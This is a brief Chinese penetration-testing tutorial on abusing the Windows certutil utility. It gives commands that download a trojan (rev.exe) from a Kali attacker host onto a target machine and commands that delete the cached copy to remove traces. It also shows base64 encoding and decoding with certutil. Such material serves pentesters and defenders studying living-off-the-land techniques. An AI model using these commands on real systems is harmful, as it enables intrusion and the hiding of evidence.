Certutil使用

一、Certutil简介

详细说明：https://docs.microsoft.com/en-us/previous-versions/orphan-topics/ws.10/cc755341(v=ws.10)?redirectedfrom=MSDN

二、Certutil使用系统

适用于：Windows Server 2003，Windows Server 2003 R2，带有SP1的Windows Server 2003，带有SP2的Windows Server 2003

三、渗透中的实际应用

1.downloader

保存在当前路径，文件名称和下载文件名称相同

在kali上开启服务，下载木马到目标机机

certutil  -urlcache  -split  -f http://192.168.137.128/rev.exe

保存在当前路径，指定保存文件名称

certutil  -urlcache  -split  -f http://192.168.137.128/rev.exe rev123.exe

保存在缓存目录，名称随机

certutil  -urlcache   -f http://192.168.137.128/rev.exe

路径

C:\Users\tenet\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content

2.清除下载文件副本方法

直接删除缓存目录对应文件

命令行

certutil  -urlcache   -f   http://192.168.137.128/rev.exe delete

3.补充

查看缓存项目

certutil.exe -urlcache *

base64编码转换

base64编码

CertUtil -encode 1.txt 2.txt

base64解码

CertUtil -decode 2.txt 3.txt
